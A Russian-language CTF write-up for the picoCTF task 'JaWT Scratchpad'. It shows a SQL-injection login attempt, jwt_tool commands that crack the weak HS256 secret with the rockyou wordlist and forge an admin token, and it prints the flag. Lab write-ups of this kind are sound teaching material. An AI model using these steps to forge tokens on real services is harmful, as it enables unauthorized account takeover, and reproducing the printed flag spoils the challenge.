# Задание JaWT Scratchpad

Для начала нам предлагается перейти на сайт (что и делаем). Далее нас встречает окно ввода логина и предлагается авторизироваться (также есть пометка, что admin получит «специальный» блокнот). Пробуем провести SQL-инъекцию admin' \-- ' (рис 1)

![img](media/Задание_JaWT_Scratchpad/media/image1.png)

Никакого эффекта это не дало, однако название задания и самого сайта наталкивает на JWT-токены. Для этого нам понадобится утилита jwt-tool (&lt;https://github.com/ticarpi/jwt_tool&gt;), словарь rockyou и burp suite. Получаем токен в JWT-tool, устанавливаем словарь rockyou и через команду (jwt_tool -C -d \~/rockyou.txt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGFuaWlsIn0.Oo1h8-zN8zjMfz98hJW1TTI4XNB8BtQ23HZ6ZAsthOo) и в итоге мы находим секрет (им оказывается фраза «ilovepico», которую мы теперь используем для генерации нового токена) (рис 2)

![img](media/Задание_JaWT_Scratchpad/media/image2.png)

Командой «jwt_tool \'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGFuaWlsIn0.Oo1h8-zN8zjMfz98hJW1TTI4XNB8BtQ23HZ6ZAsthOo\' -I -pc user -pv admin -S hs256 -p ilovepico» мы пересобираем с нужным нам значением name = admin и получаем токен «eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s», который успешно отправляем в burp suite и видим флаг (рис 3)

![img](media/Задание_JaWT_Scratchpad/media/image3.png)

## **ОТВЕТ: picoCTF\{jawt_was_just_what_you_thought_f859ab2f\}**

